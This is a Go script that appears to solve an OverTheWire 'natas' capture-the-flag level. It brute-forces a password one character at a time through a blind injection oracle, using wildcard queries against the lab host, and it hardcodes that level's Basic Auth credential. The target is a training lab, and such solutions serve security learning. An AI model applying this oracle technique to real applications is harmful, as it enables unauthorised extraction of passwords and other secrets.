package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"net/http"
	"strings"
)

func basicAuth(username, password string) string {
	auth := username + ":" + password
	return base64.StdEncoding.EncodeToString([]byte(auth))
}

var arr = []string{"0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"}

func main() {

	pass := ""
	for {
		error := false

		for i, abc := range arr {
			if result(pass + abc + "%") {
				pass = pass + abc
				fmt.Println(pass)
				break
			}
			if i == len(arr)-1 {
				error = true
			}
		}

		if error {
			break
		}

	}

	fmt.Println("La password è: ", pass)
	//pass := "a%"

}

func result(pass string) bool {
	client := &http.Client{}
	req, _ := http.NewRequest("GET", "http://natas16.natas.labs.overthewire.org?needle="+pass, nil)
	req.Header.Add("Authorization", "Basic "+basicAuth("natas16", "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"))
	res, _ := client.Do(req)

	buf := new(bytes.Buffer)
	buf.ReadFrom(res.Body)
	bs := buf.String()
	//fmt.Println(bs)
	if strings.Contains(bs, "This user exists") {
		return true
	}
	return false

}
